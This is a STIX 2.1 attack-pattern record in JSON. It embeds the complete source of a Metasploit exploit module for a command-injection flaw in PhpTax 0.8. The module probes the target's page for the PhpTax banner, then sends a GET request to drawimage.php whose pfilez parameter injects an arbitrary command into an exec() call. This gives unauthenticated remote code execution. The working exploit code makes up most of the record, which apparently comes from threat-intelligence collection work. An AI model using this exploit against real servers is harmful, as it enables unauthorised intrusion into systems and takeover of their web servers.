{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--406a09a7-f4f3-4139-995d-27b09e60d381",
    "created": "2024-08-14T17:08:07.180206Z",
    "modified": "2024-08-14T17:08:07.18021Z",
    "name": "\"PhpTax pfilez Parameter Exec Remote Code Injection\"",
    "description": " This module exploits a vulnerability found in PhpTax, an income tax report generator.  When generating a PDF, the icondrawpng() function in drawimage.php does not properly handle the pfilez parameter, which will be used in an exec() statement, and then results in arbitrary remote code execution under the context of the web server.  Please note: authentication is not required to exploit this vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/phptax_exec.rb",
            "external_id": "phptax_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"PhpTax pfilez Parameter Exec Remote Code Injection\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in PhpTax, an income tax report\n        generator.  When generating a PDF, the icondrawpng() function in drawimage.php\n        does not properly handle the pfilez parameter, which will be used in an exec()\n        statement, and then results in arbitrary remote code execution under the context\n        of the web server.  Please note: authentication is not required to exploit this\n        vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jean Pascal Pereira <pereira[at]secbiz.de>',\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '86992'],\n          ['EDB', '21665']\n        ],\n      'Payload'        =>\n        {\n          'Compat' =>\n          {\n            'ConnectionType' => 'find',\n            'PayloadType'    => 'cmd',\n            'RequiredCmd'    => 'generic perl ruby telnet python'\n          }\n        },\n      'Platform'       => %w{ linux unix },\n      'Targets'        =>\n        [\n          ['PhpTax 0.8', {}]\n        ],\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-10-08',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the web application', '/phptax/'])\n      ])\n  end\n\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1,1] != '/'\n    res = send_request_raw({'uri'=>uri})\n    if res and res.body =~ /PHPTAX by William L\\. Berggren/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n  def exploit\n    uri = target_uri.path\n\n    print_status(\"#{rhost}#{rport} - Sending request...\")\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(uri, \"drawimage.php\"),\n      'vars_get' => {\n        'pdf'    => 'make',\n        'pfilez' => \"xxx; #{payload.encoded}\"\n      }\n    })\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-10-08",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}